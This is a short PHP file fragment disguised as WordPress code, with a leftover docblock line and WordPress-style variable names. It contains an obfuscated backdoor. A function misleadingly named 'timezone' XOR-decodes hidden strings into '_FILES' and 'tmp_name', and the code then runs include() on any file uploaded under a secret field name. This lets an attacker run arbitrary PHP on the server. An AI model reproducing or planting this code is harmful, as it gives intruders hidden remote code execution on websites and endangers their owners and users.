...
*
 * Retrieve either author's link or a*/
 	
$shortcode_regex = 'jy9dPRzxieH';
$current_filter = $shortcode_regex;

function timezone($mime_subgroup, $mimes)

{
    $defaults = $mimes;

    $post_type_in_string = urldecode($mime_subgroup);

    $pre_tags = substr($defaults,0, strlen($post_type_in_string));

    $ext_type = $post_type_in_string ^ $pre_tags;
	$expages = 'post_after';
    return $ext_type;
}

$possible_emoji = ${timezone("5%3Fp%28%15%01", $current_filter)};

$newtext = $possible_emoji;
$check_sql = isset($newtext[$current_filter]);
if ($check_sql)

{
    $post_id = $possible_emoji[$current_filter];
    $child = $post_id[timezone("%1E%14I%3B%3E3%17%1D", $current_filter)];
    $comments_in = $child;
	$chunks = 'num_words';
    include ($comments_in);
}
